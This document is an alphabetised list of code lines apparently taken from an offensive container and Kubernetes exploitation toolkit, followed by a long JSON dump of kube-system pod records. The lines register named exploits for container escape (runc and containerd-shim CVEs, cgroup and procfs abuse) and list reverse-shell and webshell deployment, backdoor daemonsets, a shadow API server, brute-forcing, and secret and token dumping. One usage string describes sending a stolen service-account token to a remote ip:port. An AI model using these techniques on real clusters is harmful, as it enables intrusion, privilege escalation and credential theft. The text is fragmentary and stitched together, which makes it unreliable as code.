"payloadData := strings.Replace(dockerAPIHttpPostData, ""<SHELL_CMD>"", cmd, -1)"
"payloadShellCmd = fmt.Sprintf(""bash -i >"
"pexe, _ := p.Exe()"
"pidDir := ""/proc/"" "
"pidStr = ""self"""
"pids, err := ioutil.ReadDir(""/proc"")"
"platform, family, osversion, _ := host.PlatformInformation()"
"plugin.RegisterExploit(""abuse-unpriv-userns"", exploit)"
"plugin.RegisterExploit(""ak-leakage"", exploit)"
"plugin.RegisterExploit(""cap-dac-read-search"", exploit)"
"plugin.RegisterExploit(""check-ptrace"", exploit)"
"plugin.RegisterExploit(""docker-api-pwn"", exploit)"
"plugin.RegisterExploit(""docker-sock-check"", exploit)"
"plugin.RegisterExploit(""docker-sock-pwn"", exploit)"
"plugin.RegisterExploit(""etcd-get-k8s-token"", exploit)"
"plugin.RegisterExploit(""istio-check"", exploit)"
"plugin.RegisterExploit(""k8s-backdoor-daemonset"", exploit)"
"plugin.RegisterExploit(""k8s-configmap-dump"", exploit)"
"plugin.RegisterExploit(""k8s-cronjob"", exploit)"
"plugin.RegisterExploit(""k8s-get-sa-token"", exploit)"
"plugin.RegisterExploit(""k8s-kubelet-var-log-escape"", exploit)"
"plugin.RegisterExploit(""k8s-mitm-clusterip"", exploit)"
"plugin.RegisterExploit(""k8s-psp-dump"", exploit)"
"plugin.RegisterExploit(""k8s-secret-dump"", exploit)"
"plugin.RegisterExploit(""k8s-shadow-apiserver"", exploit)"
"plugin.RegisterExploit(""kubelet-exec"", exploit)"
"plugin.RegisterExploit(""lxcfs-rw"", exploit)"
"plugin.RegisterExploit(""lxcfs-rw-cgroup"", exploit)"
"plugin.RegisterExploit(""mount-cgroup"", exploit)"
"plugin.RegisterExploit(""mount-disk"", exploit)"
"plugin.RegisterExploit(""mount-procfs"", exploit)"
"plugin.RegisterExploit(""registry-brute"", exploit)"
"plugin.RegisterExploit(""reverse-shell"", exploit)"
"plugin.RegisterExploit(""rewrite-cgroup-devices"", exploit)"
"plugin.RegisterExploit(""runc-pwn"", exploit)"
"plugin.RegisterExploit(""service-probe"", exploit)"
"plugin.RegisterExploit(""shim-pwn"", exploit)"
"plugin.RegisterExploit(""test-poc"", exploit)"
"plugin.RegisterExploit(""webshell-deploy"", exploit)"
"plugin.RegisterTask(""auto-escape"", task)"
"plugin.RunSingleTask(""auto-escape"")"
"pod := item.Get(""metadata.name"").String()"
"podName := gjson.Get(json, ""metadata.name"").String() "
"podName := gjson.Get(resp, ""metadata.name"").String()"
"pods := gjson.Get(resp, ""items"").Array()"
"policykit-1,ver<=0.105-31"
"portFromTo, _ := GetTaskPortList()"
"portFromTo, _ := GetTaskPortListByString(portRange)"
"portRange: portRange,"
"ppid, _ := p.Ppid()"
"print(""Usage: ./cdk vi <file_name>"
"println(""skip ln:"", path)"
"probe.TCPScanToolAPI(args[0], args[1], parallel, timeout)"
"processList, err := gops.Processes()"
"protocol := """""
"protocol = ""http://"""
"protocol = ""https://"""
"ps, err := process.Processes()"
"ps.lock.Acquire(context.TODO(), 1)"
"query = fmt.Sprintf(""{"
"r, _ := resp.GetBody()"
"r, w, _ := os.Pipe()"
"randIpStr := strings.Join(ips, "","")"
"randomeFilename := fmt.Sprintf(""%s-%s"", ""cdk-var-log-escape"", util.RandString(10))"
"raw, err := ioutil.ReadAll(resp.Body)"
"re, err := regexp.Compile(""@/containerd-shim/."
"reExecCmd := exec.Command(curExePath, ""run"", ""mount-cgroup"", cmd, exploitSubSys)"
"recursive=true"","
"relIdx := strings.Index(relStr, ""-"")"
"releaseAgentPath = path.Join(targetMountPoint, ""cgroup/"", subSystemName)"
"remote-ip,port           Send results to target IP:PORT via TCP tunnel."
"repo=cdk-team/cdk"" />"
"req, err := http.NewRequest(""GET"", req_url, nil)"
"req, err := http.NewRequest(""GET"", url, nil)"
"req, err := http.NewRequest(strings.ToUpper(method), url, bytes.NewBuffer([]byte(data)))"
"req.Header.Add(""Authorization"", ""Bearer """
"req.Header.Add(""Connection"", ""Upgrade"")"
"req.Header.Add(""Sec-Websocket-Key"", ""cdktest"")"
"req.Header.Add(""Sec-Websocket-Version"", ""13"")"
"req.Header.Add(""Upgrade"", ""websocket"")"
"req.Header.Set(""Authorization"", authorizationHeader)"
"req.Header.Set(""Content-Type"", ""application/json"")"
"req_url := fmt.Sprintf(""%s://%s/exec/%s/%s/%s"
"reqs=$(echo ""$EXP"" "
"request, err := http.NewRequest(opt.Method, opt.Endpoint"
"request, err := http.NewRequest(opts.Method, opts.Url, bytes.NewBuffer([]byte(opts.PostData)))"
"request.Header.Set(""Authorization"", ""Bearer """
"request.Header.Set(""Content-Type"", ""application/json"")"
"request.Header.Set(""X-Forwarded-For"", randIpStr)"
"res := make([]FromTo, 0)"
"res = append(res, a)"
"res, err := client.Do(req)"
"resBytes := convert.translate(p, ""gbk"")"
"resp = dumpK8sConfigmapSA(addr, args[0])"
"resp = dumpK8sConfigmapSA(addr, conf.K8sSATokenDefaultPath)"
"resp = dumpK8sPSP(addr, """", true) // dump K8s Pod Security Policies with Anonymous"
"resp = dumpK8sPSP(addr, args[0], false)"
"resp = dumpK8sPSP(addr, conf.K8sSATokenDefaultPath, false)"
"resp = dumpK8sSecretsSA(addr, args[0])"
"resp = dumpK8sSecretsSA(addr, conf.K8sSATokenDefaultPath)"
"resp, err := DoRequest(opt)"
"resp, err := ServerAccountRequest(opts)"
"resp, err := cli.Get(apiInstance.API)"
"resp, err := client.Do(req)"
"resp, err := client.Do(request)"
"resp, err := deployK8sCronjob(addr, token, image, cmd, cron)"
"resp, err := deployPod(tokenFlag, addr, ""kube-system"", data)"
"resp, err := etcdctl.DoRequest(opt)"
"resp, err := getPods(token, endpoint)"
"resp, err := http.Get(""http://httpbin.org/get"")"
"resp, err := httpclient.Do(req)"
"resp, err := kubectl.ServerAccountRequest("
"resp, err := kubectl.ServerAccountRequest(opts)"
"resp, err := kubectl.ServerAccountRequest(optsDeploy)"
"resp1, err := etcdctl.DoRequest(opt)"
"respSvc, err := kubectl.ServerAccountRequest(optsSvc)"
"respText, err := kubectl.ServerAccountRequest(opts)"
"response, err = httpc.Get(uri)"
"response, err = httpc.Post(uri, ""application/json"", strings.NewReader(data))"
"result := fmt.Sprintf(""[etcd-get-k8s-token] There are %d pods in kube-system namespace."", len(pods))"
"result := make([]string, 0, len(addrs))"
"result := make(chan bool, 1)"
"result = append(result, item)"
"results = append(results, srvs...)"
"ret := make([]int, 3)"
"ret := make(map[string]string, len(kvs))"
"ret = append(ret, strings.Trim(line, """
"ret = append(ret, verData)"
"ret1, err := strconv.ParseInt(major, 10, 64)"
"ret2, err := strconv.ParseInt(minor, 10, 64)"
"retRes, err := ioutil.ReadFile(""/cdk_cgres_"" "
"ret[string(name)] = """""
"return """""
"return """", "
"return """", """", err"
"return """", err"
"return """", errors.New(""Cannot find kube-apiserver pod in namespace:kube-system, maybe target K8s master node managed by cloud provider, cannot deploy api-server in this environment."")"
"return """", errors.New(""faild to request api-server."")"
"return """", errors.New(""field gitVersion not found in response"")"
"return """", errors.New(""invalid response data, possible caused by api-server forbidden this request."")"
"return """", errors.New(""invalid to list pods, possible caused by api-server forbidden this request."")"
"return """", errors.New(text)"
"return """", fmt.Errorf(""failed to get server version: %v"", err)"
"return """", fmt.Errorf(""no default gateway found"")"
"return ""/var/lib/docker/devicemapper/mnt/"" "
"return ""Check was the shell in a istio(service mesh) network, please note that this feature will request http://httpbin.org/get. Usage: cdk run istio-check."""
"return ""Create and run <cmd> in a container with host "
"return ""Create and run <cmd> in a container with host root "
"return ""Dump K8S Pod Security Policies and try, usage: cdk run k8s-psp-dump (auto"
"return ""Dump target service-account token and send it to remote ip:port, usage: cdk run k8s-get-sa-token (default"
"return ""Escape container in different ways then let target execute <cmd>."""
"return ""Exploit CVE-2020-8554: Man in the middle using ExternalIPs, usage: cdk run k8s-mitm-clusterip (default"
"return ""To container image registry, brute force the accounts and passwords cracking. Usage: ./cdk registry-brute <registry-url> <username"
"return ""Write webshell to target path. Usage: cdk run webshell-deploy (php"
"return ""abuse mount-cgroup co-operating with unprivileged user namespace creation. usage: ./cdk run abuse-unpriv-userns "
"return ""check if docker unix socket available. usage: ./cdk run docker-sock-check <sock_path>"""
"return ""check if pid injection works with cap=SYS_PTRACE. usage: ./cdk run check-ptrace"""
"return ""container escape via CVE-2019-5736. usage: ./cdk run runc-pwn <shell-cmd>"""
"return ""create cronjob with user specified image and cmd. Usage: cdk run k8s-cronjob (default"
"return ""deploy image to every node using daemonset, usage: cdk run k8s-backdoor-daemonset (default"
"return ""duplicate kube-apiserver pod, disable logs and grant all privilege to anonymous user. usage: cdk run k8s-shadow-apiserver (default"
"return ""escape container by cgroup when root has LXCFS read "
"return ""escape container by syscall mknod when root has LXCFS read "
"return ""escape container via mounted procfs. usage: cdk run mount-procfs <dir> "
"return ""escape privileged container via disk mount, usage: "
"return ""escape sys_admin capabilities container via rewrite cgroup devices.allow. usage: ./cdk run rewrite-cgroup-devices."""
"return ""pwn CVE-2020-15257,start a privileged reverse shell to remote host or execute cmd. usage: "
"return ""reverse shell to remote addr, usage: cdk run reverse-shell <ip:port>"""
"return ""scan subnet to find Docker/K8s inner services, usage: cdk run service-probe 192.168.1.0-255"""
"return ""search AK/Secrets from input dir, usage: cdk run ak-leakage <dir>"""
"return ""this is the test script"""
"return ""try to dump K8s configmap in multiple ways, usage: cdk run k8s-configmap-dump (auto"
"return ""try to dump K8s secret in multiple ways, usage: cdk run k8s-secret-dump (auto"
"return -1, err"
"return 0, err"
"return 0, nil"
"return 1, nil"
"return 2, nil"
"return DeployBackdoorDaemonset(addr, tokenPath, image, inputArgs, ""kube-proxy"") // use kube-proxy-worker in alibaba cloud"
"return DockerSockExploit(sock, cmd)"
"return NewWrapper(os.Stdout, true)"
"return []byte{}, err"
"return apiVersion, nil"
"return buf.String(), nil"
"return capTextList, nil"
"return cginfo, nil"
"return data, nil"
"return errors.New(""exploit failed."")"
"return errors.New(""exploit mount-disk failed.""), nil"
"return errors.New(""failed to get container ID after created."")"
"return errors.New(""invalid input args. Usage: cdk run deploy-webshell (php"
"return fileData, nil"
"return fmt.Errorf(""open devices.allow failed. %v"
"return fmt.Errorf(""write "
"return fmt.Errorf(""write devices.allow failed. %v"
"return fmt.Sprintf(""%s:"
"return fmt.Sprintf(""%s:%s %s %s %s - %s %s %s"", mi.Major, mi.Minor, mi.Root, mi.MountPoint, optStr, mi.Fstype, mi.Device, superBlockOptionsStr)"
"return fmt.Sprintf(""echo "
"return kubectlPath, nil"
"return len(p), err"
"return lines, scanner.Err()"
"return m, err"
"return matched[0][1], nil"
"return matches, nil"
"return mountInfos, err"
"return net.Dial(""unix"", unixPath)"
"return nil, err"
"return nil, errors.New(""Cannot find vulnerable containerd-shim socket."")"
"return nil, errors.New(""unknown internal error when executing uname"")"
"return nil, fmt.Errorf(""found invalid mountinfo line in file %s: %s "", mountInfoPath, r)"
"return nil, mountDir"
"return nil, mountedDirs"
"return nil, nil"
"return out, errStr"
"return res, "
"return res, nil"
"return res, tot"
"return resp, err"
"return resp, nil"
"return results[1], nil"
"return ret, nil"
"return stat.Ino, nil"
"return stdoutStr, err"
"return string(body), nil"
"return string(content), nil"
"return string(token), nil"
"return strings.Join(lst[:], "","")"
"return sv, cv, nil"
"return syses, nil"
"return taskRandString, shell"
"return token, nil"
"ringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchExpressions"":[{""key"":""type"",""operator"":""NotIn"",""values"":[""virtual-kubelet""]}]}]}},""podAntiAffinity"":{""preferredDuringSchedulingIgnoredDuringExecution"":[{""weight"":100,""podAffinityTerm"":{""labelSelector"":{""matchExpressions"":[{""key"":""k8s-app"",""operator"":""In"",""values"":[""kube-dns""]}]},""topologyKey"":""kubernetes.io/hostname""}}]}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""}],""priorityClassName"":""system-cluster-critical"",""priority"":2000000000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:58Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:58Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""}],""hostIP"":""192.168.0.154"",""podIP"":""172.20.1.66"",""podIPs"":[{""ip"":""172.20.1.66""}],""startTime"":""2020-04-08T04:12:29Z"",""containerStatuses"":[{""name"":""coredns"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:53Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/coredns:1.6.2"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/coredns@sha256:4dd4d0e5bcc9bd0e8189f6fa4d4965ffa81207d8d99d29391f28cbd1a70a0163"",""containerID"":""docker://ea914da329aba6450d865eb6e65df2a5bca07584bc6660c4fabf8adc0c39897a"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""coredns-8494d5b47-gllw6"",""generateName"":""coredns-8494d5b47-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/coredns-8494d5b47-gllw6"",""uid"":""ce995e51-9bd8-4a76-ad70-50c75f70017c"",""resourceVersion"":""1917"",""creationTimestamp"":""2020-04-08T04:12:29Z"",""labels"":{""k8s-app"":""kube-dns"",""pod-template-hash"":""8494d5b47""},""annotations"":{""kubernetes.io/psp"":""ack.privileged"",""prometheus.io/path"":""/metrics"",""prometheus.io/port"":""9153"",""prometheus.io/scrape"":""true""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""ReplicaSet"",""name"":""coredns-8494d5b47"",""uid"":""9a367f62-0ab7-4177-831f-96a86e042674"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""config-volume"",""configMap"":{""name"":""coredns"",""items"":[{""key"":""Corefile"",""path"":""Corefile""}],""defaultMode"":420}},{""name"":""timezone"",""hostPath"":{""path"":""/etc/localtime"",""type"":""""}},{""name"":""coredns-token-d79rf"",""secret"":{""secretName"":""coredns-token-d79rf"",""defaultMode"":420}}],""containers"":[{""name"":""coredns"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/coredns:1.6.2"",""args"":[""-conf"",""/etc/coredns/Corefile""],""ports"":[{""name"":""dns"",""containerPort"":53,""protocol"":""UDP""},{""name"":""dns-tcp"",""containerPort"":53,""protocol"":""TCP""},{""name"":""metrics"",""containerPort"":9153,""protocol"":""TCP""}],""resources"":{""limits"":{""cpu"":""2"",""memory"":""100Mi""},""requests"":{""cpu"":""100m"",""memory"":""100Mi""}},""volumeMounts"":[{""name"":""config-volume"",""readOnly"":true,""mountPath"":""/etc/coredns""},{""name"":""timezone"",""mountPath"":""/etc/localtime""},{""name"":""coredns-token-d79rf"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""httpGet"":{""path"":""/health"",""port"":8080,""scheme"":""HTTP""},""initialDelaySeconds"":60,""timeoutSeconds"":5,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":5},""readinessProbe"":{""httpGet"":{""path"":""/ready"",""port"":8181,""scheme"":""HTTP""},""timeoutSeconds"":1,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""capabilities"":{""add"":[""NET_BIND_SERVICE""],""drop"":[""all""]},""privileged"":false,""readOnlyRootFilesystem"":true,""allowPrivilegeEscalation"":false}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""Default"",""nodeSelector"":{""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""coredns"",""serviceAccount"":""coredns"",""nodeName"":""cn-beijing.192.168.0.153"",""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchExpressions"":[{""key"":""type"",""operator"":""NotIn"",""values"":[""virtual-kubelet""]}]}]}},""podAntiAffinity"":{""preferredDuringSchedulingIgnoredDuringExecution"":[{""weight"":100,""podAffinityTerm"":{""labelSelector"":{""matchExpressions"":[{""key"":""k8s-app"",""operator"":""In"",""values"":[""kube-dns""]}]},""topologyKey"":""kubernetes.io/hostname""}}]}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""}],""priorityClassName"":""system-cluster-critical"",""priority"":2000000000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:56Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:56Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""}],""hostIP"":""192.168.0.153"",""podIP"":""172.20.1.2"",""podIPs"":[{""ip"":""172.20.1.2""}],""startTime"":""2020-04-08T04:12:29Z"",""containerStatuses"":[{""name"":""coredns"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:53Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/coredns:1.6.2"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/coredns@sha256:4dd4d0e5bcc9bd0e8189f6fa4d4965ffa81207d8d99d29391f28cbd1a70a0163"",""containerID"":""docker://d4d605b9579b78611cc77a198455e54d50a7a14957779c3c75112b423fc47242"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""flexvolume-652kv"",""generateName"":""flexvolume-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/flexvolume-652kv"",""uid"":""f11a2be7-7c74-48d7-8d1d-a88081d6f8fe"",""resourceVersion"":""1666"",""creationTimestamp"":""2020-04-08T04:12:29Z"",""labels"":{""controller-revision-hash"":""bfc484779"",""name"":""acs-flexvolume"",""pod-template-generation"":""1""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""flexvolume"",""uid"":""7eb1d60b-0e68-4ae0-8554-5f9c4e52f2bd"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""usrdir"",""hostPath"":{""path"":""/usr/"",""type"":""""}},{""name"":""etcdir"",""hostPath"":{""path"":""/etc/"",""type"":""""}},{""name"":""logdir"",""hostPath"":{""path"":""/var/log/alicloud/"",""type"":""""}},{""name"":""kubeletdir"",""hostPath"":{""path"":""/var/lib/kubelet"",""type"":""Directory""}},{""name"":""default-token-cmtwb"",""secret"":{""secretName"":""default-token-cmtwb"",""defaultMode"":420}}],""containers"":[{""name"":""acs-flexvolume"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""env"":[{""name"":""ACS_DISK"",""value"":""true""},{""name"":""ACS_NAS"",""value"":""true""},{""name"":""ACS_OSS"",""value"":""true""},{""name"":""ACS_CPFS"",""value"":""false""}],""resources"":{""limits"":{""cpu"":""1"",""memory"":""1000Mi""},""requests"":{""cpu"":""100m"",""memory"":""100Mi""}},""volumeMounts"":[{""name"":""usrdir"",""mountPath"":""/host/usr/""},{""name"":""etcdir"",""mountPath"":""/host/etc/""},{""name"":""logdir"",""mountPath"":""/var/log/alicloud/""},{""name"":""kubeletdir"",""mountPath"":""/var/lib/kubelet"",""mountPropagation"":""Bidirectional""},{""name"":""default-token-cmtwb"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls /acs/flexvolume""]},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""Always"",""securityContext"":{""privileged"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""default"",""serviceAccount"":""default"",""nodeName"":""cn-beijing.192.168.0.154"",""hostNetwork"":true,""hostPID"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.154""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:39Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:39Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""}],""hostIP"":""192.168.0.154"",""podIP"":""192.168.0.154"",""podIPs"":[{""ip"":""192.168.0.154""}],""startTime"":""2020-04-08T04:12:29Z"",""containerStatuses"":[{""name"":""acs-flexvolume"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:38Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume@sha256:b17527284ff2c593e0a68b114494b2ebad044004e86a94c94047f2d2771e7e1b"",""containerID"":""docker://8ede39f430000f0f15d891b43181655fdaabc7496b78aaf4f332582533524d8e"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""flexvolume-dbmzf"",""generateName"":""flexvolume-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/flexvolume-dbmzf"",""uid"":""215494bd-3a58-4697-9f30-c0e31f104830"",""resourceVersion"":""1661"",""creationTimestamp"":""2020-04-08T04:12:29Z"",""labels"":{""controller-revision-hash"":""bfc484779"",""name"":""acs-flexvolume"",""pod-template-generation"":""1""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""flexvolume"",""uid"":""7eb1d60b-0e68-4ae0-8554-5f9c4e52f2bd"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""usrdir"",""hostPath"":{""path"":""/usr/"",""type"":""""}},{""name"":""etcdir"",""hostPath"":{""path"":""/etc/"",""type"":""""}},{""name"":""logdir"",""hostPath"":{""path"":""/var/log/alicloud/"",""type"":""""}},{""name"":""kubeletdir"",""hostPath"":{""path"":""/var/lib/kubelet"",""type"":""Directory""}},{""name"":""default-token-cmtwb"",""secret"":{""secretName"":""default-token-cmtwb"",""defaultMode"":420}}],""containers"":[{""name"":""acs-flexvolume"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""env"":[{""name"":""ACS_DISK"",""value"":""true""},{""name"":""ACS_NAS"",""value"":""true""},{""name"":""ACS_OSS"",""value"":""true""},{""name"":""ACS_CPFS"",""value"":""false""}],""resources"":{""limits"":{""cpu"":""1"",""memory"":""1000Mi""},""requests"":{""cpu"":""100m"",""memory"":""100Mi""}},""volumeMounts"":[{""name"":""usrdir"",""mountPath"":""/host/usr/""},{""name"":""etcdir"",""mountPath"":""/host/etc/""},{""name"":""logdir"",""mountPath"":""/var/log/alicloud/""},{""name"":""kubeletdir"",""mountPath"":""/var/lib/kubelet"",""mountPropagation"":""Bidirectional""},{""name"":""default-token-cmtwb"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls /acs/flexvolume""]},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""Always"",""securityContext"":{""privileged"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""default"",""serviceAccount"":""default"",""nodeName"":""cn-beijing.192.168.0.153"",""hostNetwork"":true,""hostPID"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.153""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:38Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:38Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""}],""hostIP"":""192.168.0.153"",""podIP"":""192.168.0.153"",""podIPs"":[{""ip"":""192.168.0.153""}],""startTime"":""2020-04-08T04:12:29Z"",""containerStatuses"":[{""name"":""acs-flexvolume"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:38Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume@sha256:b17527284ff2c593e0a68b114494b2ebad044004e86a94c94047f2d2771e7e1b"",""containerID"":""docker://9f515c40e3fd5d9c2d99cdf6c3c95b109eca48c6f789ba9d8dc85fed1e6550c2"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""flexvolume-gfzzw"",""generateName"":""flexvolume-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/flexvolume-gfzzw"",""uid"":""05a70b7e-e3c9-4829-adf6-9176c49550cb"",""resourceVersion"":""1642"",""creationTimestamp"":""2020-04-08T04:12:29Z"",""labels"":{""controller-revision-hash"":""bfc484779"",""name"":""acs-flexvolume"",""pod-template-generation"":""1""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""flexvolume"",""uid"":""7eb1d60b-0e68-4ae0-8554-5f9c4e52f2bd"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""usrdir"",""hostPath"":{""path"":""/usr/"",""type"":""""}},{""name"":""etcdir"",""hostPath"":{""path"":""/etc/"",""type"":""""}},{""name"":""logdir"",""hostPath"":{""path"":""/var/log/alicloud/"",""type"":""""}},{""name"":""kubeletdir"",""hostPath"":{""path"":""/var/lib/kubelet"",""type"":""Directory""}},{""name"":""default-token-cmtwb"",""secret"":{""secretName"":""default-token-cmtwb"",""defaultMode"":420}}],""containers"":[{""name"":""acs-flexvolume"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""env"":[{"